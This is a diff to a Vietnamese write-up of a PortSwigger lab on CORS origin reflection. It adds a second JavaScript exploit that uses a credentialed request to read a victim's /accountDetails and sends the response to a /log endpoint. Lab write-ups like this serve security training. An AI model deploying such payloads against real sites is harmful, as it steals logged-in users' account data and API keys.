@@ -3,7 +3,7 @@
 ### 1. CORS vulnerability with basic origin reflection
 https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
 
-Context: 
+Context: trusted all origin
 
 ![alt text](image.png)
 
@@ -27,4 +27,26 @@ Thêm `Origin: https://example.com` vào request và ở response xuất hiện 
         location='/log?key='+this.responseText;
     };
 </script>
+```
+
+hoặc 
+```js
+<html>
+    <body>
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = "Lab-id"
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE) {
+                    fetch("/log?key=" + xhr.responseText)
+                }
+            }
+
+            xhr.open('GET', url + "/accountDetails", true);
+            xhr.withCredentials = true;
+            xhr.send(null)
+        </script>
+    </body>
+</html>
 ```
